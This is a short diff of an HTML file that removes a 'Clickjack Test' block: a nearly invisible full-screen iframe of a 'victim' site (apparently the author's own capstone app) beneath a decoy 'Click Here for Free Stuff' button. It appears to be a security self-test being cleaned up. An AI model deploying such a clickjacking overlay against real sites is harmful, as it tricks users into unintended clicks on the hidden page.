@@ -164,44 +164,6 @@
 </div>
 </div>
 
-      <title>Clickjack Test</title>
-  <style>
-    body {
-      margin: 0;
-      overflow: hidden;
-    }
-
-    iframe {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      opacity: 0.01; /* Make it nearly invisible */
-      z-index: 10;
-      border: none;
-      pointer-events: auto;
-    }
-
-    button {
-      position: relative;
-      z-index: 20;
-      font-size: 24px;
-      padding: 20px 40px;
-      margin: 100px auto;
-      display: block;
-      cursor: pointer;
-    }
-  </style>
-</head>
-<body>
-
-  <!-- Victim site in iframe -->
-  <iframe src="https://repro-capstone.onrender.com"></iframe>
-
-  <!-- Fake CTA -->
-  <button>Click Here for Free Stuff</button>
-
     <script src="script.js"></script>
 </body>
 </html>
